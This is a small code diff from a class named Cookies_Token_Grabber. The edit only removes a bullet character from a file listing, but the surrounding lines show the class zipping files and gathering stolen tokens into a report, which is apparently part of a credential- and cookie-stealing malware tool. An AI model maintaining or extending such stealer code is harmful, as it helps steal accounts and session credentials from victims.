@@ -470,7 +470,7 @@ class Cookies_Token_Grabber(functions):
         zipped_file.close()
         files_found = ''
         for f in os.listdir(self.dir):
-            files_found += f"・{f}\n"
+            files_found += f"{f}\n"
         tokens = ''
         for tkn in self.tokens:
             tokens += f'{tkn}\n\n'
